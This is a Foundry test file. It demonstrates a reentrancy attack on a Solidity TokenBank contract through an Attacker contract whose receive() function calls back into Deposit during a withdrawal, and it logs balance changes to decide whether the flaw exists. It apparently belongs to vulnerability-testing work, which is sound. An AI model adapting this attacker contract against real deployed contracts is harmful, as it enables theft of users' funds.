// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/0x39cfd754c85023648bf003bea2dd498c5612abfa.sol";

contract Attacker {
    TokenBank public bank;
    uint256 public reenterAmount;
    bool public attacked;

    constructor(TokenBank _bank, uint256 _reenterAmount) {
        bank = _bank;
        reenterAmount = _reenterAmount;
    }

    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            bank.Deposit{value: reenterAmount}();
        }
    }
}

contract TokenBankReentrancyTest is Test {
    TokenBank public bank;
    Attacker public attacker;
    address owner = address(0xa);
    address attackerEOA = address(0xb);
    uint256 constant DEPOSIT_AMOUNT = 1.5 ether;
    uint256 constant REENTER_AMOUNT = 1.5 ether;

    function setUp() public {
        // Fund accounts
        vm.deal(owner, 10 ether);
        vm.deal(attackerEOA, 10 ether);
        
        // Deploy bank
        vm.startPrank(owner);
        bank = new TokenBank();
        bank.Deposit{value: DEPOSIT_AMOUNT}(); // Owner deposit
        vm.stopPrank();
        
        // Deploy attacker contract
        vm.prank(attackerEOA);
        attacker = new Attacker(bank, REENTER_AMOUNT);
        
        // Attacker deposit
        vm.prank(attackerEOA);
        attacker.deposit{value: DEPOSIT_AMOUNT}();
    }

    function testReentrancy() public {
        // Pre-state assertions
        assertEq(bank.Holders(owner), DEPOSIT_AMOUNT, "Owner balance mismatch");
        assertEq(bank.Holders(address(attacker)), DEPOSIT_AMOUNT, "Attacker balance mismatch");
        assertEq(address(bank).balance, 3 ether, "Bank balance mismatch");

        console2.log("--- BEFORE-Trigger Reentrancy ---");
        uint256 preAttackerBankBalance = bank.Holders(address(attacker));
        uint256 preBankETHBalance = address(bank).balance;
        uint256 preAttackerETHBalance = address(attacker).balance;
        console2.log("Attacker bank balance:", preAttackerBankBalance);
        console2.log("Bank contract ETH:", preBankETHBalance);
        console2.log("Attacker contract ETH:", preAttackerETHBalance);

        console2.log("--- Trigger Reentrancy ---");
        vm.prank(owner);
        bank.WithdrawToHolder(address(attacker), DEPOSIT_AMOUNT);

        console2.log("--- AFTER-Trigger Reentrancy ---");
        uint256 postAttackerBankBalance = bank.Holders(address(attacker));
        uint256 postBankETHBalance = address(bank).balance;
        uint256 postAttackerETHBalance = address(attacker).balance;
        console2.log("Attacker bank balance:", postAttackerBankBalance);
        console2.log("Bank contract ETH:", postBankETHBalance);
        console2.log("Attacker contract ETH:", postAttackerETHBalance);

        // Check if vulnerable state changes occurred
        bool bankBalanceChanged = postBankETHBalance != preBankETHBalance;
        bool attackerBankBalanceChanged = postAttackerBankBalance != preAttackerBankBalance;
        bool attackerETHBalanceChanged = postAttackerETHBalance != preAttackerETHBalance;
        
        console2.log("Bank balance changed:", bankBalanceChanged);
        console2.log("Attacker bank balance changed:", attackerBankBalanceChanged);
        console2.log("Attacker ETH balance changed:", attackerETHBalanceChanged);
        
        // Vulnerability exists if state variables changed unexpectedly
        bool vulnerabilityExists = (!bankBalanceChanged && 
                                   !attackerBankBalanceChanged && 
                                   attackerETHBalanceChanged);
        
        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Successful reentrancy attack detected");
        } else {
            console2.log("Vulnerability not Exists: No signs of successful reentrancy");
        }
        
        // Post-state assertions
        assertEq(attacker.attacked(), true, "Reentrancy not triggered");
        assertEq(
            bank.Holders(address(attacker)), 
            DEPOSIT_AMOUNT, 
            "Attacker holder balance should remain due to reentrancy"
        );
    }
}